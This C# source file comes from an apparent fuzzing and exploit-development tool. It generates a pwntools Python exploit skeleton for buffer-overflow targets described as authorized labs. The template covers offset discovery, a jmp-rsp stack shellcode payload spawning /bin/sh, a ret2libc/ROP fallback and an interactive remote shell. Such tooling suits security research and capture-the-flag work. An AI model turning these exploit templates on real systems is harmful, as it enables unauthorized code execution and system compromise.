using System.Text;

namespace Randall.Infrastructure;

/// <summary>
/// Emits a ready-to-edit pwntools exploit skeleton for a lab target — the "make it fun / user
/// friendly" bridge from a Randfuzz crash to a working exploit. Pre-fills host/port, a cyclic
/// pattern for offset discovery, the known offset (when found), and a shellcode placeholder, plus
/// inline hints for the NX-off / no-PIE / ASLR-off case.
/// </summary>
public static class PwntoolsExporter
{
    public static string Generate(string exePath, string host, int port, int? offset, bool nxOff, bool pieOff)
    {
        var b = new StringBuilder();
        b.AppendLine("#!/usr/bin/env python3");
        b.AppendLine("# Randfuzz-generated exploit skeleton (authorized lab targets only).");
        b.AppendLine("# Edit the marked TODOs. Workflow: find offset -> control RIP -> place payload.");
        b.AppendLine("from pwn import *");
        b.AppendLine();
        b.AppendLine($"context.update(arch='amd64', os='linux', log_level='info')");
        b.AppendLine($"BIN  = {Py(exePath)}");
        b.AppendLine($"HOST = {Py(host)}");
        b.AppendLine($"PORT = {port}");
        b.AppendLine($"elf  = context.binary = ELF(BIN, checksec=True)");
        b.AppendLine();
        b.AppendLine("def start():");
        b.AppendLine("    return remote(HOST, PORT)   # or: process([BIN, '-p', str(PORT)]) for local");
        b.AppendLine();
        if (offset is null)
        {
            b.AppendLine("# --- Stage 1: find the offset ---------------------------------------------");
            b.AppendLine("# Send a cyclic pattern, let it crash, read the faulting register, then:");
            b.AppendLine("#   randall exploitdev --exe <bin> --core <core> --pattern-len 200");
            b.AppendLine("# or in a debugger with the value:  cyclic_find(0x6141...)  ");
            b.AppendLine("OFFSET = 0   # TODO: set from findmsp / randall exploitdev");
            b.AppendLine("payload = cyclic(200)   # TODO: replace with the real payload once OFFSET is known");
        }
        else
        {
            b.AppendLine("# --- Offset already found by Randfuzz -------------------------------------");
            b.AppendLine($"OFFSET = {offset}");
            b.AppendLine();
            if (nxOff && pieOff)
            {
                b.AppendLine("# NX off + no PIE: classic stack shellcode.");
                b.AppendLine("# 1) find a 'jmp rsp' gadget in the image (static, since no PIE):");
                b.AppendLine("#      jmp_rsp = next(elf.search(asm('jmp rsp')))");
                b.AppendLine("shellcode = asm(shellcraft.sh())   # /bin/sh");
                b.AppendLine("jmp_rsp = 0xdeadbeef   # TODO: address of `jmp rsp` (elf.search(asm('jmp rsp')) / gef search-pattern)");
                b.AppendLine("payload  = flat({");
                b.AppendLine("    0:      b'A' * OFFSET,");
                b.AppendLine("    OFFSET: p64(jmp_rsp),");
                b.AppendLine("    OFFSET + 8: asm('nop') * 16 + shellcode,");
                b.AppendLine("})");
            }
            else
            {
                b.AppendLine("# NX on / PIE: use ret2libc or a ROP chain (leak first if PIE/ASLR).");
                b.AppendLine("rop = ROP(elf)");
                b.AppendLine("# rop.call('system', [next(elf.search(b'/bin/sh'))])  # example");
                b.AppendLine("payload = flat({0: b'A'*OFFSET, OFFSET: rop.chain()})");
            }
        }
        b.AppendLine();
        b.AppendLine("io = start()");
        b.AppendLine("io.recvuntil(b'HELP')   # banner (adjust to your target)");
        b.AppendLine("io.sendline(b'ECHO ' + payload)   # TODO: adjust command prefix for your target");
        b.AppendLine("io.interactive()   # pop a shell if it worked");
        return b.ToString();
    }

    private static string Py(string s) => "'" + s.Replace("\\", "\\\\").Replace("'", "\\'") + "'";
}
